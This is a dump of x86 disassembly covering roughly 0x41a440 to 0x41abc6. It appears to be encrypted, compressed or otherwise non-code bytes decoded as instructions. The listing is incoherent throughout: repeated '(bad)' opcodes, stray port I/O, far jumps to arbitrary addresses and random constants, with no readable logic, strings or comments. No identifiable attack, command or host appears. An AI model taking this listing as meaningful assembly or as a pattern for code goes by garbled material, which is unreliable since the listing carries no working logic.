  41a440:	xlat   BYTE PTR ds:[ebx]
  41a441:	retf   0xf443
  41a444:	js     0x41a3f1
  41a446:	and    BYTE PTR cs:[edx+0x50],0xfd
  41a44b:	rcr    DWORD PTR ss:[esi-0x17],0x9e
  41a450:	pushf  
  41a451:	mov    al,ds:0x560d779d
  41a456:	jns    0x41a443
  41a458:	add    eax,0x7d1b1b37
  41a45d:	ja     0x41a4cb
  41a45f:	test   BYTE PTR [ebp+0x3f],ah
  41a462:	jo     0x41a499
  41a464:	pushf  
  41a465:	push   eax
  41a466:	das    
  41a467:	aad    0x7f
  41a469:	(bad)  
  41a46a:	test   cl,0x6d
  41a46d:	jbe    0x41a3f0
  41a46f:	mov    bl,0xc7
  41a471:	or     al,0xf7
  41a473:	pop    esp
  41a474:	sbb    edi,DWORD PTR [edi-0x12]
  41a477:	data16 loop 0x41a492
  41a47a:	in     eax,0xe3
  41a47c:	xor    DWORD PTR [esp+esi*1],eax
  41a47f:	push   esp
  41a480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a481:	ret    
  41a482:	pop    edx
  41a483:	in     eax,0x55
  41a485:	fs clc 
  41a487:	inc    ebp
  41a488:	leave  
  41a489:	add    ebp,DWORD PTR ds:0xa83ae5d8
  41a48f:	mov    ah,0x6e
  41a491:	gs pop ebp
  41a493:	pxor   mm1,mm2
  41a496:	jo     0x41a423
  41a498:	pop    es
  41a499:	dec    edi
  41a49a:	mov    cl,BYTE PTR [eax+0x6066d346]
  41a4a0:	sbb    edx,DWORD PTR [esi+0x39]
  41a4a3:	sti    
  41a4a4:	call   0x4034852a
  41a4a9:	js     0x41a42f
  41a4ab:	(bad)  
  41a4ac:	jbe    0x41a4f0
  41a4ae:	pushf  
  41a4af:	add    ch,BYTE PTR [ecx+ebx*1+0x43]
  41a4b3:	out    0x79,al
  41a4b5:	out    0x4d,eax
  41a4b7:	pop    ebx
  41a4b8:	(bad)  
  41a4b9:	loopne 0x41a51e
  41a4bb:	pushf  
  41a4bc:	daa    
  41a4bd:	div    BYTE PTR [edx+0x433a4b27]
  41a4c3:	pop    edi
  41a4c4:	mov    ds:0x130bef3b,eax
  41a4c9:	mov    dh,al
  41a4cb:	cmc    
  41a4cc:	push   es
  41a4cd:	stc    
  41a4ce:	push   edx
  41a4cf:	push   ecx
  41a4d0:	jo     0x41a50d
  41a4d2:	lea    esi,[edx-0x5986a443]
  41a4d8:	cmc    
  41a4d9:	adc    edx,esi
  41a4db:	mov    ch,al
  41a4dd:	jecxz  0x41a4ad
  41a4df:	and    edx,esp
  41a4e1:	pop    edi
  41a4e2:	jmp    DWORD PTR [esi-0x50]
  41a4e5:	lea    eax,ds:0xaa3ab981
  41a4eb:	sub    al,0x4a
  41a4ed:	sbb    eax,0xe95fcef0
  41a4f2:	enter  0x2717,0xaa
  41a4f6:	mov    al,0x8c
  41a4f8:	jmp    0x842371a9
  41a4fd:	inc    esi
  41a4fe:	add    ebp,DWORD PTR [ecx+0x27]
  41a501:	and    eax,0x9ae58827
  41a506:	xor    BYTE PTR [ebx-0x5b],dl
  41a509:	jg     0x41a507
  41a50b:	lea    edx,[ecx+0x28]
  41a50e:	idiv   DWORD PTR [ecx-0x44]
  41a511:	imul   ebp,DWORD PTR [eax-0x64336558],0x3b5bb6a4
  41a51b:	mov    edi,0x18e14981
  41a520:	mov    bh,0x30
  41a522:	rol    DWORD PTR [edx+edi*2],1
  41a525:	xor    eax,0x56f38de2
  41a52a:	pop    edx
  41a52b:	jl     0x41a58e
  41a52d:	add    ebp,DWORD PTR [eax]
  41a52f:	dec    ebp
  41a530:	sbb    dh,BYTE PTR ds:0xcb68c72c
  41a536:	call   0xec48cac5
  41a53b:	cdq    
  41a53c:	or     al,dh
  41a53e:	cmp    eax,0xf073d784
  41a543:	xchg   edx,eax
  41a544:	js     0x41a5a8
  41a546:	lahf   
  41a547:	mov    edi,0x93887122
  41a54c:	add    eax,0x197446b5
  41a551:	test   DWORD PTR [ecx],esp
  41a553:	or     eax,0xcfe45e76
  41a558:	xchg   edi,eax
  41a559:	mov    ds:0x1786fe92,al
  41a55e:	inc    ebp
  41a55f:	ins    DWORD PTR es:[edi],dx
  41a560:	fnstenv [eax+0x24fe9bbe]
  41a566:	mov    eax,0x9fa4aca5
  41a56b:	cmp    BYTE PTR [ecx],ch
  41a56d:	enter  0x6a03,0x9c
  41a571:	mov    ch,0xa7
  41a573:	or     ebx,DWORD PTR [eax-0x7e]
  41a576:	sub    eax,0xcc007140
  41a57b:	mov    esp,0xea5a97c3
  41a580:	or     bl,BYTE PTR [ebx+0x294c4679]
  41a586:	pusha  
  41a587:	daa    
  41a588:	ja     0x41a557
  41a58a:	and    BYTE PTR [edx-0x67afb18f],al
  41a590:	in     al,0x1f
  41a592:	repnz sub edx,DWORD PTR [edx+edx*8+0xdc24966]
  41a59a:	ret    
  41a59b:	stos   DWORD PTR es:[edi],eax
  41a59c:	push   cs
  41a59d:	(bad)  
  41a59e:	pop    edx
  41a59f:	ins    DWORD PTR es:[edi],dx
  41a5a0:	test   eax,0x12601aec
  41a5a5:	aad    0x7
  41a5a7:	mov    ds:0x3baa90e3,al
  41a5ac:	out    dx,al
  41a5ad:	push   ss
  41a5ae:	scas   al,BYTE PTR es:[edi]
  41a5af:	das    
  41a5b0:	dec    ebp
  41a5b1:	pop    esp
  41a5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5b3:	and    edx,DWORD PTR [ebx+0x1a]
  41a5b6:	jns    0x41a606
  41a5b8:	ja     0x41a606
  41a5ba:	mov    bl,0xf6
  41a5bc:	outs   dx,BYTE PTR ds:[esi]
  41a5bd:	ins    BYTE PTR es:[edi],dx
  41a5be:	xlat   BYTE PTR ds:[ebx]
  41a5bf:	push   0x71
  41a5c1:	and    al,0x12
  41a5c3:	push   edx
  41a5c4:	out    0x1e,al
  41a5c6:	xchg   al,al
  41a5c8:	cdq    
  41a5c9:	fcomip st,st(1)
  41a5cb:	mov    esp,0x888b024d
  41a5d0:	lods   eax,DWORD PTR ds:[esi]
  41a5d1:	jno    0x41a639
  41a5d3:	push   0x2b
  41a5d5:	add    BYTE PTR [eax+0x4f5a2e1a],al
  41a5db:	call   0x180f1b42
  41a5e0:	cmp    dh,ch
  41a5e2:	lahf   
  41a5e3:	add    BYTE PTR [ebp+0x3b58a5a4],ch
  41a5e9:	int3   
  41a5ea:	xor    esi,ebx
  41a5ec:	dec    edx
  41a5ed:	inc    eax
  41a5ee:	xor    BYTE PTR [edx],dh
  41a5f0:	or     al,BYTE PTR [eax]
  41a5f2:	jmp    0x41a5a2
  41a5f4:	rcl    DWORD PTR [ecx+0x3af7b800],cl
  41a5fa:	or     esp,DWORD PTR ds:0x192f6e12
  41a600:	dec    edx
  41a601:	in     eax,0x4b
  41a603:	add    dh,cl
  41a605:	fadd   DWORD PTR [edx]
  41a607:	sub    al,0x24
  41a609:	arpl   ax,bp
  41a60b:	call   0xa4a968b0
  41a610:	out    0x6a,eax
  41a612:	icebp  
  41a613:	jp     0x41a647
  41a615:	sub    esi,edx
  41a617:	adc    BYTE PTR [esi],ah
  41a619:	push   edx
  41a61a:	mov    ds:0x1a299343,al
  41a61f:	mov    ch,0xfa
  41a621:	outs   dx,BYTE PTR ds:[esi]
  41a622:	cmp    esp,DWORD PTR [eax-0x62]
  41a625:	mov    edi,0x5e1646de
  41a62a:	inc    ecx
  41a62b:	add    BYTE PTR [eax+ecx*4],bl
  41a62e:	in     eax,dx
  41a62f:	add    ch,bh
  41a631:	int3   
  41a632:	sub    edi,edx
  41a634:	in     al,dx
  41a635:	lahf   
  41a636:	add    eax,0x824aee20
  41a63b:	add    BYTE PTR [eax+0x263150bd],al
  41a641:	hlt    
  41a642:	pop    ds
  41a643:	cwde   
  41a644:	cmp    eax,0xd584875f
  41a649:	dec    ebp
  41a64a:	les    ebx,FWORD PTR [esi+0x6e8fa7f4]
  41a650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a651:	add    eax,0xb696da25
  41a656:	arpl   WORD PTR ds:0xa7547c85,bp
  41a65c:	sub    dl,BYTE PTR [ecx]
  41a65e:	iret   
  41a65f:	adc    DWORD PTR [edx-0x62],esi
  41a662:	mov    WORD PTR [ebp+0x39],?
  41a665:	cmp    al,0x8f
  41a667:	push   ds
  41a668:	push   ss
  41a669:	pop    esp
  41a66a:	mov    esi,edx
  41a66c:	outs   dx,DWORD PTR ds:[esi]
  41a66d:	(bad)  
  41a66e:	sbb    eax,0x160006ab
  41a673:	(bad)  
  41a674:	repz jmp 0x41a677
  41a677:	lods   eax,DWORD PTR ds:[esi]
  41a678:	push   ecx
  41a679:	jle    0x41a6bf
  41a67b:	fnsetpm(287 only) 
  41a67d:	pop    ss
  41a67e:	xchg   edx,ebp
  41a680:	or     ah,BYTE PTR [ebx+0x61ee50ac]
  41a686:	ja     0x41a611
  41a688:	std    
  41a689:	mov    ds:0x93af2178,eax
  41a68e:	into   
  41a68f:	daa    
  41a690:	inc    ebx
  41a691:	stc    
  41a692:	pop    edx
  41a693:	in     al,0xfa
  41a695:	push   cs
  41a696:	xchg   ebp,eax
  41a697:	adc    BYTE PTR [eax+0x52ac0433],0x69
  41a69e:	std    
  41a69f:	push   ecx
  41a6a0:	hlt    
  41a6a1:	or     DWORD PTR [eax],ecx
  41a6a3:	adc    BYTE PTR [edi+0x7605aef2],bl
  41a6a9:	(bad)  
  41a6aa:	lahf   
  41a6ab:	call   0x4c50:0xdf9c86d
  41a6b2:	mov    eax,0x6b11451a
  41a6b7:	sub    al,0x56
  41a6b9:	ret    
  41a6ba:	fdivr  QWORD PTR [eax-0x183c6c39]
  41a6c0:	pop    esp
  41a6c1:	add    dl,BYTE PTR [eax+0x7f469239]
  41a6c7:	sti    
  41a6c8:	mov    ah,0x48
  41a6ca:	das    
  41a6cb:	mov    ds:0x76a8aa29,eax
  41a6d0:	xor    ecx,DWORD PTR [esi-0x1402e8a9]
  41a6d6:	add    cl,BYTE PTR ss:[edx-0x596993f2]
  41a6dd:	mov    ecx,0x7d68e2a8
  41a6e2:	mov    ds:0xd829eb7e,al
  41a6e7:	push   0xe08c2776
  41a6ec:	pop    ebx
  41a6ed:	mov    edi,0xd8a59cce
  41a6f2:	and    BYTE PTR [esi-0x24],0x71
  41a6f6:	and    BYTE PTR [ebx+0xf56a605],0x0
  41a6fd:	sub    DWORD PTR [edx+0x40829f16],esi
  41a703:	adc    ah,bl
  41a705:	adc    BYTE PTR [esp+edx*4+0x41],dh
  41a709:	mov    dh,0x59
  41a70b:	inc    eax
  41a70c:	push   edi
  41a70d:	(bad)  
  41a70e:	inc    BYTE PTR [eax]
  41a710:	call   0x977f:0x225695fc
  41a717:	(bad)  
  41a718:	push   cs
  41a719:	fwait
  41a71a:	adc    ebp,ecx
  41a71c:	out    0x55,al
  41a71e:	pusha  
  41a71f:	and    eax,0x5f38bde0
  41a724:	pop    ebx
  41a725:	mov    ebp,DWORD PTR [edi+0x4e]
  41a728:	inc    eax
  41a729:	inc    edx
  41a72a:	xor    DWORD PTR [edx+eax*8-0x4a26db02],edi
  41a731:	daa    
  41a732:	or     al,bl
  41a734:	paddusw mm3,QWORD PTR [ebx-0x45404452]
  41a73b:	and    al,0xc7
  41a73d:	jo     0x41a744
  41a73f:	test   eax,0x946f4609
  41a744:	and    ah,dh
  41a746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a747:	out    0x8a,al
  41a749:	iret   
  41a74a:	sub    DWORD PTR [ecx+0x3c],0xe0556060
  41a751:	mov    ebx,0x5b68afc1
  41a756:	popa   
  41a757:	adc    eax,DWORD PTR [edi]
  41a759:	icebp  
  41a75a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a75c:	dec    esi
  41a75d:	xor    BYTE PTR [ecx-0x49],ch
  41a760:	aaa    
  41a761:	sar    ebp,1
  41a763:	repz sbb ah,BYTE PTR cs:[ebx+0x47]
  41a768:	adc    cl,dh
  41a76a:	data16 jns 0x41a731
  41a76d:	inc    eax
  41a76e:	fnstsw WORD PTR [edx+0x77]
  41a771:	push   0x43
  41a773:	les    esp,FWORD PTR [edi+0x235a7014]
  41a779:	sbb    eax,0x4bf67eee
  41a77e:	xor    DWORD PTR [edi-0x1a],esi
  41a781:	mov    ecx,0x5bd9a480
  41a786:	clc    
  41a787:	stos   BYTE PTR es:[edi],al
  41a788:	xchg   BYTE PTR [edx],bl
  41a78a:	push   cs
  41a78b:	aam    0x4b
  41a78d:	sub    eax,0x94950c63
  41a792:	popa   
  41a793:	fdivp  st(6),st
  41a795:	xchg   edx,eax
  41a796:	out    0x49,al
  41a798:	push   es
  41a799:	loopne 0x41a756
  41a79b:	imul   ebx,DWORD PTR [edi],0xffffff81
  41a79e:	pop    ebx
  41a79f:	sub    DWORD PTR [esi+eiz*2+0x6bdb21d6],esi
  41a7a6:	leave  
  41a7a7:	cmp    DWORD PTR [ecx-0x30],esp
  41a7aa:	repz xor al,0x1c
  41a7ad:	les    esi,FWORD PTR [edx-0x492c5098]
  41a7b3:	or     ebp,DWORD PTR [edx+esi*1-0x5e13cca7]
  41a7ba:	cmp    BYTE PTR [ebx],cl
  41a7bc:	or     al,0x6a
  41a7be:	inc    ebp
  41a7bf:	in     al,0x19
  41a7c1:	repnz sub eax,0xcff774e1
  41a7c7:	xchg   edx,eax
  41a7c8:	push   ecx
  41a7c9:	nop
  41a7ca:	push   esp
  41a7cb:	mov    esp,gs
  41a7cd:	jno    0x41a7b3
  41a7cf:	pop    esp
  41a7d0:	or     eax,0x551a1032
  41a7d5:	das    
  41a7d6:	arpl   WORD PTR [edi],bp
  41a7d8:	dec    ecx
  41a7d9:	rep lods al,BYTE PTR ds:[esi]
  41a7db:	sbb    dl,BYTE PTR [edi]
  41a7dd:	dec    ebx
  41a7de:	dec    esi
  41a7df:	xchg   ebp,eax
  41a7e0:	pop    esp
  41a7e1:	loope  0x41a7b8
  41a7e3:	xor    DWORD PTR [ecx-0x5a],ecx
  41a7e6:	xchg   ebx,eax
  41a7e7:	cmp    ebp,ecx
  41a7e9:	ffreep st(5)
  41a7eb:	call   0x3c5f:0xe2c41cfb
  41a7f2:	mov    eax,ds:0x9b22e5f2
  41a7f7:	mov    al,cs:0xbdce9440
  41a7fd:	test   al,0x6e
  41a7ff:	pop    esp
  41a800:	mov    dl,0xec
  41a802:	sbb    DWORD PTR [ecx],edx
  41a804:	adc    al,BYTE PTR [esp+edx*2-0x47d74f44]
  41a80b:	adc    eax,0xb0fcc8b1
  41a810:	inc    BYTE PTR [edx]
  41a812:	adc    cl,BYTE PTR ds:0xbaa0e060
  41a818:	dec    ebx
  41a819:	jno    0x41a852
  41a81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a81c:	fisub  WORD PTR [esi+0x7c]
  41a81f:	in     al,0x1f
  41a821:	retf   0x8cb9
  41a824:	aam    0x64
  41a826:	sub    al,0xf3
  41a828:	les    edi,FWORD PTR [ebp+0x46]
  41a82b:	mov    WORD PTR [esi],ss
  41a82d:	lds    eax,FWORD PTR [esi-0x69]
  41a830:	jns    0x41a7c0
  41a832:	jecxz  0x41a7fd
  41a834:	jg     0x41a8b4
  41a836:	lock mov edx,edi
  41a839:	cdq    
  41a83a:	jecxz  0x41a7f4
  41a83c:	pusha  
  41a83d:	leave  
  41a83e:	ret    0xf530
  41a841:	and    BYTE PTR [ecx-0x19ea4070],0x6
  41a848:	xor    ax,ax
  41a84b:	sbb    DWORD PTR [esp+esi*1],eax
  41a84e:	cmp    al,0xf9
  41a850:	leave  
  41a851:	lods   eax,DWORD PTR ds:[esi]
  41a852:	(bad)  
  41a853:	outs   dx,BYTE PTR ds:[esi]
  41a854:	int    0x78
  41a856:	enter  0x6600,0xbb
  41a85a:	lea    edi,[ecx]
  41a85c:	adc    eax,0x4db0d7bc
  41a861:	mov    cl,0x8
  41a863:	(bad)  
  41a864:	xor    DWORD PTR [ebx],esi
  41a866:	imul   BYTE PTR [ecx-0x63]
  41a869:	pop    ebx
  41a86a:	retf   
  41a86b:	loope  0x41a8d5
  41a86d:	ss mov edi,esp
  41a870:	mov    ds:0x5b24153b,eax
  41a875:	fstp   TBYTE PTR [ebx+0x9]
  41a878:	mov    esp,0xe2f27291
  41a87d:	in     eax,0xa8
  41a87f:	adc    al,BYTE PTR [esi-0x2047bf8b]
  41a885:	ret    0xc764
  41a888:	ins    DWORD PTR es:[edi],dx
  41a889:	sub    eax,0x102f3752
  41a88e:	fsubr  DWORD PTR [ebp+0x15]
  41a891:	xchg   esi,eax
  41a892:	es adc dh,dh
  41a895:	(bad)  
  41a896:	das    
  41a897:	loopne 0x41a904
  41a899:	mov    esi,DWORD PTR [edx]
  41a89b:	outs   dx,BYTE PTR ds:[esi]
  41a89c:	pop    edi
  41a89d:	fdiv   DWORD PTR [ebp-0x3a]
  41a8a0:	mov    eax,ds:0xd70707ff
  41a8a5:	in     eax,dx
  41a8a6:	(bad)  
  41a8a7:	adc    ebx,DWORD PTR ds:0x4e98c233
  41a8ad:	mov    dl,BYTE PTR [edx+0x6a]
  41a8b0:	into   
  41a8b1:	add    cl,BYTE PTR [ebx]
  41a8b3:	cmp    DWORD PTR [esi-0x4c1df83b],eax
  41a8b9:	dec    edi
  41a8ba:	dec    esp
  41a8bb:	out    0xe6,eax
  41a8bd:	fstp   TBYTE PTR [ecx+0x57]
  41a8c0:	jnp    0x41a878
  41a8c2:	out    0xed,al
  41a8c4:	xchg   ebx,eax
  41a8c5:	sub    BYTE PTR [eax-0x7fcd1027],dh
  41a8cb:	xchg   DWORD PTR [esi],esi
  41a8cd:	inc    ebp
  41a8ce:	div    DWORD PTR [ecx+0x18]
  41a8d1:	dec    ebp
  41a8d2:	inc    ebx
  41a8d3:	mov    WORD PTR [ebx-0x664a4ee6],ds
  41a8d9:	fucom  st(0)
  41a8db:	call   0x4edcef1b
  41a8e0:	or     BYTE PTR [ebp-0x76],ah
  41a8e3:	data16 loop 0x41a933
  41a8e6:	or     DWORD PTR [eax+0xec905c4],ecx
  41a8ec:	arpl   WORD PTR [esi+0x5f828b],cx
  41a8f2:	mov    ch,BYTE PTR [ebx]
  41a8f4:	xor    eax,esi
  41a8f6:	nop
  41a8f7:	shl    DWORD PTR [ebx],1
  41a8f9:	jbe    0x41a93b
  41a8fb:	push   cs
  41a8fc:	scas   eax,DWORD PTR es:[edi]
  41a8fd:	ret    
  41a8fe:	lea    eax,[ecx+0x2437b143]
  41a904:	inc    edi
  41a905:	pop    esp
  41a906:	pop    esi
  41a907:	and    cl,cl
  41a909:	call   0x423c:0x2805dff0
  41a910:	inc    esp
  41a911:	sub    eax,0xd2a0210c
  41a916:	je     0x41a8c7
  41a918:	xchg   edi,eax
  41a919:	aas    
  41a91a:	cmp    ebx,DWORD PTR [eax+0x20]
  41a91d:	out    0xb3,eax
  41a91f:	test   DWORD PTR [eax-0x2],0x1675ebbe
  41a926:	or     ebp,DWORD PTR [edi-0x6d5378a]
  41a92c:	pop    edx
  41a92d:	jae    0x41a944
  41a92f:	fs xor al,0x14
  41a932:	repz cld 
  41a934:	clc    
  41a935:	jne    0x41a93a
  41a937:	mov    BYTE PTR [esi+0x66],ch
  41a93a:	ficom  WORD PTR [edi-0x4ac145fd]
  41a940:	(bad)  
  41a941:	push   ebx
  41a942:	jae    0x41a9aa
  41a944:	jp     0x41a95b
  41a946:	sub    BYTE PTR [ebp+eax*4+0x6ac37ce1],0xe5
  41a94e:	cmc    
  41a94f:	pop    eax
  41a950:	push   ecx
  41a951:	push   0xf0d2769c
  41a956:	inc    DWORD PTR [edi]
  41a958:	xlat   BYTE PTR ds:[ebx]
  41a959:	mov    cs,WORD PTR [ecx-0x49]
  41a95c:	pop    esi
  41a95d:	gs in  al,0xf7
  41a960:	jb     0x41a913
  41a962:	push   esp
  41a963:	fwait
  41a964:	ins    DWORD PTR es:[edi],dx
  41a965:	(bad)  
  41a966:	out    dx,eax
  41a967:	outs   dx,DWORD PTR ds:[esi]
  41a968:	es push 0xffffffd9
  41a96b:	xor    edi,0xffffffa8
  41a96e:	sbb    DWORD PTR [edi-0x60a784c9],0xd5c70799
  41a978:	xchg   esp,eax
  41a979:	retf   
  41a97a:	mov    DWORD PTR [ecx],0xcbd3722
  41a980:	cmc    
  41a981:	sbb    al,0xa8
  41a983:	xchg   esp,eax
  41a984:	push   ebx
  41a985:	call   0x88e48974
  41a98a:	shl    BYTE PTR [eax],cl
  41a98c:	out    0x4a,eax
  41a98e:	xor    DWORD PTR [ebp+edi*4+0x17],0xffffff91
  41a993:	push   esp
  41a994:	cdq    
  41a995:	mov    ecx,gs
  41a997:	jp     0x41a944
  41a999:	dec    eax
  41a99a:	loopne 0x41a950
  41a99c:	fnstcw WORD PTR [edi+0x25]
  41a99f:	pop    ecx
  41a9a0:	mov    WORD PTR [ecx-0x58],?
  41a9a3:	jae    0x41a92d
  41a9a5:	fist   DWORD PTR [edx-0x1a]
  41a9a8:	cmp    edi,DWORD PTR [ebp-0x2d01bf0f]
  41a9ae:	pop    eax
  41a9af:	mov    edi,0x7268f11d
  41a9b4:	push   ebp
  41a9b5:	sahf   
  41a9b6:	push   esp
  41a9b7:	mov    bh,0x4b
  41a9b9:	mov    bh,0x4a
  41a9bc:	(bad)  
  41a9bd:	arpl   WORD PTR ds:0xb7aa924a,sp
  41a9c3:	pusha  
  41a9c4:	pop    edi
  41a9c5:	out    dx,eax
  41a9c6:	cmp    DWORD PTR [esi],edi
  41a9c8:	and    eax,0xefc65ebd
  41a9cd:	and    BYTE PTR [edx-0x2e6c3438],cl
  41a9d3:	mov    ds:0xcb411ef8,al
  41a9d8:	shl    BYTE PTR [ecx],cl
  41a9da:	mov    eax,0x4a833855
  41a9df:	stos   BYTE PTR es:[edi],al
  41a9e0:	retf   
  41a9e1:	mov    dh,0x37
  41a9e3:	push   cs
  41a9e4:	jns    0x41a9fd
  41a9e6:	mov    esi,0xa254a0e
  41a9eb:	ret    0xc31e
  41a9ee:	and    esp,DWORD PTR [esi-0x903403]
  41a9f4:	pop    esp
  41a9f5:	imul   esp,ebp,0xab388d29
  41a9fb:	(bad)  
  41a9fc:	cmp    ebp,edx
  41a9fe:	jnp    0x41aa77
  41aa00:	out    dx,eax
  41aa01:	clc    
  41aa02:	push   eax
  41aa03:	push   ecx
  41aa04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa05:	stc    
  41aa06:	xor    ebp,DWORD PTR [ecx+0xa]
  41aa09:	sub    edx,DWORD PTR ds:0xc2b91586
  41aa0f:	xor    eax,0xc3c778
  41aa14:	mov    eax,0x163ef859
  41aa19:	ja     0x41aa4b
  41aa1b:	jmp    0x1877e73
  41aa20:	inc    ebx
  41aa21:	and    BYTE PTR [esi],bl
  41aa23:	push   es
  41aa24:	fistp  QWORD PTR [edi]
  41aa26:	xchg   edx,eax
  41aa27:	xchg   edi,eax
  41aa28:	(bad)  [edx+0x5a9e1a2d]
  41aa2e:	fistp  WORD PTR [esi]
  41aa30:	retf   
  41aa31:	xchg   BYTE PTR [esi+0x724bd9b0],bh
  41aa37:	jmp    0x1e2f:0x56a065d4
  41aa3e:	rol    bh,0x37
  41aa41:	dec    eax
  41aa42:	leave  
  41aa43:	repz mov ebp,0x87817d57
  41aa49:	mulps  xmm4,XMMWORD PTR [edx]
  41aa4c:	dec    eax
  41aa4d:	jmp    0x41aa7c
  41aa4f:	sub    bh,bl
  41aa51:	lahf   
  41aa52:	aaa    
  41aa53:	popf   
  41aa54:	jae    0x41aa2a
  41aa56:	push   ebx
  41aa57:	mov    edx,0xdf5a3152
  41aa5c:	les    ebp,FWORD PTR [edi]
  41aa5e:	shl    BYTE PTR ds:0x3927b28b,1
  41aa64:	ret    
  41aa65:	dec    esp
  41aa66:	mov    ah,0x6f
  41aa68:	adc    BYTE PTR [esi],dh
  41aa6a:	in     eax,dx
  41aa6b:	sahf   
  41aa6c:	mov    al,0xdb
  41aa6e:	lods   eax,DWORD PTR ds:[esi]
  41aa6f:	pushf  
  41aa70:	inc    esi
  41aa71:	sbb    BYTE PTR [eax-0x69],bh
  41aa74:	outs   dx,DWORD PTR ds:[esi]
  41aa75:	hlt    
  41aa76:	and    dh,BYTE PTR [edi+0x1cf7954c]
  41aa7c:	aas    
  41aa7d:	jge    0x41aa8f
  41aa7f:	outs   dx,BYTE PTR ds:[esi]
  41aa80:	sbb    al,0x83
  41aa82:	mov    edx,0x6f7c0b1b
  41aa87:	dec    esi
  41aa88:	mov    al,0x45
  41aa8a:	cmc    
  41aa8b:	lds    eax,FWORD PTR [ecx]
  41aa8d:	push   edx
  41aa8e:	xchg   BYTE PTR [esi+eiz*4-0x1f],bh
  41aa92:	xlat   BYTE PTR ds:[ebx]
  41aa93:	ins    DWORD PTR es:[edi],dx
  41aa94:	push   ds
  41aa95:	mov    ds:0x6f384a1,eax
  41aa9a:	pop    esp
  41aa9b:	cs loopne 0x41aa3e
  41aa9e:	popf   
  41aa9f:	test   al,0xb9
  41aaa1:	ds pop ecx
  41aaa3:	fldcw  WORD PTR ds:0x48fa3b05
  41aaa9:	push   ebx
  41aaaa:	xchg   ebx,eax
  41aaab:	cmp    al,0x8a
  41aaad:	xor    eax,0xc8275b
  41aab2:	and    al,0xb5
  41aab4:	add    DWORD PTR [ecx+ebp*2],0xdcf7589d
  41aabb:	adc    BYTE PTR [eax],al
  41aabd:	icebp  
  41aabe:	imul   ecx,DWORD PTR [edx-0x5b],0xfaf211d5
  41aac5:	push   0x4
  41aac7:	stos   BYTE PTR es:[edi],al
  41aac8:	push   0x49d77cf8
  41aacd:	in     al,dx
  41aace:	mov    al,ds:0xee3bef8c
  41aad3:	jge    0x41aa9c
  41aad5:	or     edi,esp
  41aad7:	int3   
  41aad8:	mov    bl,0x38
  41aada:	mov    esi,0x2f0accb3
  41aadf:	aad    0xf7
  41aae1:	jmp    0xeee1:0xc6a9aea7
  41aae8:	cmp    eax,DWORD PTR [edi+0x66]
  41aaeb:	and    edx,DWORD PTR [edx-0x16]
  41aaee:	jp     0x41aaf1
  41aaf0:	xlat   BYTE PTR ds:[ebx]
  41aaf1:	cmp    cl,BYTE PTR [ebx-0x5]
  41aaf4:	jle    0x41aa92
  41aaf6:	sub    BYTE PTR [ebp+0x6c],dl
  41aaf9:	xchg   esi,eax
  41aafa:	jb     0x41ab40
  41aafc:	jnp    0x41aaee
  41aafe:	adc    ah,BYTE PTR ds:0xbbc6dd43
  41ab04:	or     BYTE PTR [ebx+0x4b4bdb35],0xab
  41ab0b:	dec    edx
  41ab0c:	dec    esp
  41ab0d:	mov    al,ds:0xe4681157
  41ab12:	test   DWORD PTR [edi],esp
  41ab14:	fnstenv [eiz*2-0x49e540d3]
  41ab1b:	ds dec edi
  41ab1d:	pop    ecx
  41ab1e:	mov    ecx,0x186844d
  41ab23:	sub    DWORD PTR ss:[edi-0x78da36ab],esp
  41ab2a:	sbb    bh,BYTE PTR [esi-0x2a]
  41ab2d:	jg     0x41ab50
  41ab2f:	push   ebp
  41ab30:	mov    ah,0x98
  41ab32:	pop    edx
  41ab33:	aas    
  41ab34:	pusha  
  41ab35:	sub    DWORD PTR [edi+edx*8-0x41],esp
  41ab39:	mov    dl,0x41
  41ab3b:	mov    dl,0x92
  41ab3d:	mov    ecx,cs
  41ab3f:	or     DWORD PTR [edi+edx*2],ecx
  41ab42:	outs   dx,BYTE PTR ds:[esi]
  41ab43:	cmp    al,0xe8
  41ab45:	leave  
  41ab46:	fwait
  41ab47:	js     0x41ab75
  41ab49:	add    edx,DWORD PTR [edi]
  41ab4b:	int    0x6c
  41ab4d:	pop    ss
  41ab4e:	xchg   ebp,eax
  41ab4f:	mov    bh,BYTE PTR [eax-0x3d]
  41ab52:	(bad)  
  41ab53:	pop    ecx
  41ab54:	push   cs
  41ab55:	inc    edx
  41ab56:	or     BYTE PTR ds:0xc22b10fc,ah
  41ab5c:	mov    dh,0x53
  41ab5e:	mov    ds:0xf7e05bbd,eax
  41ab63:	sub    eax,0xe6c676d2
  41ab68:	mov    ah,ch
  41ab6a:	jae    0x41aafa
  41ab6c:	rcl    edi,cl
  41ab6e:	mov    ah,0xef
  41ab70:	outs   dx,DWORD PTR ds:[esi]
  41ab71:	ss or  al,0xf4
  41ab74:	xchg   edi,eax
  41ab75:	mov    dl,0x2b
  41ab77:	jo     0x41ab80
  41ab79:	dec    ecx
  41ab7a:	sbb    ebx,esi
  41ab7c:	call   0xf504c7cf
  41ab81:	mov    ch,0x3a
  41ab83:	pop    esp
  41ab84:	jp     0x41ab09
  41ab86:	xchg   ecx,eax
  41ab87:	addr16 sbb al,0x71
  41ab8a:	mov    esi,0xb8d513df
  41ab8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab90:	fcmovb st,st(0)
  41ab92:	mov    ecx,0xbae853b3
  41ab97:	pop    DWORD PTR [eax+edx*1]
  41ab9a:	sbb    eax,0x41ccce8e
  41ab9f:	dec    edi
  41aba0:	dec    ecx
  41aba1:	enter  0x9b6c,0x51
  41aba5:	mov    esp,0x5cd31897
  41abaa:	jne    0x41ab8a
  41abac:	push   es
  41abad:	sbb    al,0x2c
  41abaf:	jns    0x41ac0a
  41abb1:	loop   0x41ab8d
  41abb3:	add    BYTE PTR [ebx-0x29],bh
  41abb6:	dec    eax
  41abb7:	pushf  
  41abb8:	inc    eax
  41abb9:	adc    DWORD PTR [edi+0xc908545],ecx
  41abbf:	test   ebp,ecx
  41abc1:	xor    BYTE PTR [ebp-0x55],bh
  41abc4:	xlat   BYTE PTR ds:[ebx]
  41abc5:	pop    ss
  41abc6:	mov    eax,ss
